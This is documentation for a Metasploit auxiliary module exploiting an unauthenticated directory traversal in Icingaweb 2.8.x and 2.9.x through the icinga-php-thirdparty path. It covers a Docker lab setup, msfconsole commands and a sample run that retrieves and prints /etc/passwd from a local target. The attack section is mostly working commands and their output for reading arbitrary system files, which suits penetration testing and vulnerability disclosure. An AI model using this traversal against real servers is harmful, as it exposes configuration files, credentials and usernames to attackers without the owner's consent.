## Vulnerable Application

Icingaweb versions from 2.9.0 to 2.9.5 inclusive, and 2.8.0 to 2.8.5 inclusive suffer from an
unauthenticated directory traversal vulnerability. The vulnerability is triggered
through the icinga-php-thirdparty library, which allows unauthenticated users
to retrieve arbitrary files from the targets filesystem via a GET request to
`/lib/icinga/icinga-php-thirdparty/<absolute path to target file on disk>` as the user
running the Icingaweb server, which will typically be the `www-data` user.

This can then be used to retrieve sensitive configuration information from the target
such as the configuration of various services, which may reveal sensitive login or configuration information,
the `/etc/passwd` file to get a list of valid usernames for password guessing attacks, or other sensitive files
which may exist as part of additional functionality available on the target server.

This module was tested against Icingaweb 2.9.5 running on Docker.

## Install Icingaweb 2.9.5 on a Ubuntu 22.04 Docker Image

```
sudo apt-get install docker.io -y
sudo docker run -p 8080:8080 icinga/icingaweb2:2.9.5
```

Browse to port 8080 to confirm the site loads. No need to configure.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/icinga_static_library_file_directory_traversal`
4. Do: `set rhosts [ip]`
5. Do: `set file [file]`. On Docker use `/etc/passwd` for testing purposes.
6. Do: `run`
7. You should be able to retrieve a file

## Options

## Scenarios

### Icingaweb 2.9.5 on Ubuntu 22.04 running on Docker

```
[*] Processing icinga.rb for ERB directives.
resource (icinga.rb)> use scanner/http/icinga_static_library_file_directory_traversal
resource (icinga.rb)> set rhosts 127.0.0.1
rhosts => 127.0.0.1
resource (icinga.rb)> set file /etc/passwd
file => /etc/passwd
resource (icinga.rb)> check
[*] 127.0.0.1:8080 - The service is running, but could not be validated. 127.0.0.1:8080     - Icinga Web 2 found, unable to determine version.
resource (icinga.rb)> run
[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

[+] /etc/passwd saved to /root/.msf4/loot/20230421161654_default_127.0.0.1_icingafile_070863.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (icinga.rb)> loot

Loot
====

host          service  type         name         content     info  path
----          -------  ----         ----         -------     ----  ----
127.000.0.01           icinga file  /etc/passwd  text/plain        /root/.msf4/loot/20230421161654_default_127.0.0.1_icingafile_070863.txt
```
